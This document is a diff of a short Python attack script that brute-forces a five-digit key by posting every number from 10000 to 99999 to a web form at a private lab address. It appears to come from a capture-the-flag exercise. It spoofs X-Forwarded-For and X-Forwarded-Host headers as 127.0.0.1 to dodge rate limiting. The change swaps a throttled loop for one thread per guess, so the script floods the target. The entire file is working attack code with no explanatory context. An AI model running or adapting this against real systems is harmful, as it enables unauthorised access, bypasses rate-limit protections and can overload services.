@@ -2,12 +2,12 @@
 
 
 import requests
-import time
 import threading
 
 
-testVar = True
-url = "http://10.10.19.26:8085"
+
+
+url = "http://10.10.110.219:8085"
 headers = {
             "X-Forwarded-For": "127.0.0.1",
             "X-Forwarded-Host": "127.0.0.1",
@@ -20,8 +20,8 @@ headers = {
 
 session = requests.session()
 
-def bruteForce():
-    for i in range(10000,99999):
+def bruteForce(i):
+    #for i in range(i):
         data = {'number': i}
     
         r = session.post(url, data=data, headers=headers)
@@ -36,17 +36,13 @@ def bruteForce():
             print("rate limit hit")
         else:
             print(f'Found the lucky key {i}', r.text)
-            testVar = False
-            break
-
-semaphore = threading.Semaphore(100)
-
+            
+            
 
 threads = []
-while testVar == True:
-    semaphore.acquire()
-    thread = threading.Thread(target=bruteForce)
+for i in range(10000,99999):
+    thread = threading.Thread(target=bruteForce, args=(i,))
     thread.start()
     threads.append(thread)
-for thread in threads:
-    thread.join()
+
+
